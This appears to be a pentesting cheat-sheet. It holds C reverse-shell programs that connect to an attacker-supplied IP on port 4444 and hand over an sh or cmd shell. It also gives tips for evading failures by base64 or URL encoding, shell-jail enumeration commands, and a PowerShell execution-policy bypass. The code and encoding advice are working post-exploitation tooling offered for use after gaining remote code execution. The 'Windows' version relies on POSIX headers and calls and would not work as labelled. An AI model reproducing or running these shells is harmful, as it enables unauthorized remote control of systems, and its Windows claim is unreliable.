# TIPS 

If you have obtained a vulnerability such as RCE, file upload or something else, you can use the script below to spawn a shell or backconnect revershell. If the shell does not run see below

1. Make sure the target has internet access (internet access opened)
2. Try changing the port to a larger one such as 8080, 8888, etc. 
3. Encode your script using base64 and then decode it 
4. Encode your script using url encode 
5. Check the compiler 


## C script spawning shell 

``` Linux 
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 4444;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("<IP>");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"sh", NULL};
    execvp("sh", argv);

    return 0;       
}
```

## C spawning cmd 

```Windows
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 4444;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("0.0.0.0");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"cmd", NULL};
    execvp("cmd", argv);

    return 0;       
}
```

### Enum about the jail 

```
echo $SHELL
echo $PATH
env
export
pwd
```

*Windows Powershell Pro Tips 

- If you was gett the shell, change to powershell, you can run 

```
powershell -ep bypass 
```

Source 

- [Hacktrikcs Escaping from Jails](https://hacktricks.boitatech.com.br/linux-unix/privilege-escalation/escaping-from-limited-bash)
- [Hacktricks github escape from jails](https://github.com/HackTricks-wiki/hacktricks/blob/master/linux-hardening/useful-linux-commands/bypass-bash-restrictions.md)
- [0xffsec restricted-shells](https://0xffsec.com/handbook/shells/restricted-shells/)
- [Hacktrikcs powershell-for-pentesters](https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters)